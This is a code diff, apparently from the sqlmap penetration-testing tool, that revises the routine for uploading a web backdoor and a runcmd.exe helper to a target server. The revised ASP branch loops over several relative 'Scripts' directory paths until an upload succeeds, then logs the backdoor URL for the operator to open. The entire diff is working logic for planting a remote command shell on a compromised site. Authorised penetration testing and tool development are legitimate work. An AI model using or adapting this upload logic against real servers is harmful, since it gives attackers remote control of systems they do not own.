@@ -169,7 +169,7 @@ class Web:
 
         backdoorName = "tmpb%s.%s" % (randomStr(4), self.webApi)
         backdoorStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi), backdoorName)
-        backdoorContent = backdoorStream.read()
+        originalBackdoorContent = backdoorContent = backdoorStream.read()
         
         uploaderName = "tmpu%s.%s" % (randomStr(4), self.webApi)
         uploaderContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "uploader.%s_" % self.webApi))
@@ -200,20 +200,24 @@ class Web:
             logger.info(infoMsg)
             
             if self.webApi == "asp":
+                scriptsDirectory = "Scripts"
                 runcmdName = "tmpe%s.exe" % randomStr(4)
                 runcmdStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'), runcmdName)
-                scriptsDirectory = "Scripts"
-                backdoorDirectory = "%s..\%s" % (posixToNtSlashes(directory), scriptsDirectory)
-                backdoorContent = backdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", runcmdName)
-                backdoorStream.file.truncate()
-                backdoorStream.read()
-                backdoorStream.seek(0)
-                backdoorStream.write(backdoorContent)
-                if self.__webFileStreamUpload(backdoorStream, backdoorName, backdoorDirectory):
-                    self.__webFileStreamUpload(runcmdStream, runcmdName, backdoorDirectory)
-                    self.webBackdoorUrl = "%s/%s/%s" % (self.webBaseUrl.rstrip('/'), scriptsDirectory, backdoorName)
-                    self.webDirectory = directory
-                else:
+                backdoorUploaded = False
+                for backdoorDirectoryFormat in ("%s.\%s", "%s..\%s", "%s..\..\%s"):
+                    backdoorDirectory = backdoorDirectoryFormat % (posixToNtSlashes(directory), scriptsDirectory)
+                    backdoorContent = originalBackdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", runcmdName)
+                    backdoorStream.file.truncate()
+                    backdoorStream.read()
+                    backdoorStream.seek(0)
+                    backdoorStream.write(backdoorContent)
+                    if self.__webFileStreamUpload(backdoorStream, backdoorName, backdoorDirectory):
+                        self.__webFileStreamUpload(runcmdStream, runcmdName, backdoorDirectory)
+                        self.webBackdoorUrl = "%s/%s/%s" % (self.webBaseUrl.rstrip('/'), scriptsDirectory, backdoorName)
+                        self.webDirectory = backdoorDirectory
+                        backdoorUploaded = True
+                        break
+                if not backdoorUploaded:
                     continue
             elif not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(directory) if kb.os == "Windows" else directory):
                 warnMsg  = "backdoor hasn't been successfully uploaded "
@@ -231,7 +235,7 @@ class Web:
                 self.webDirectory = directory
                 
             infoMsg  = "the backdoor has probably been successfully "
-            infoMsg += "uploaded on '%s', go with your browser " % directory
+            infoMsg += "uploaded on '%s', go with your browser " % self.webDirectory
             infoMsg += "to '%s' and enjoy it!" % self.webBackdoorUrl
             logger.info(infoMsg)
 
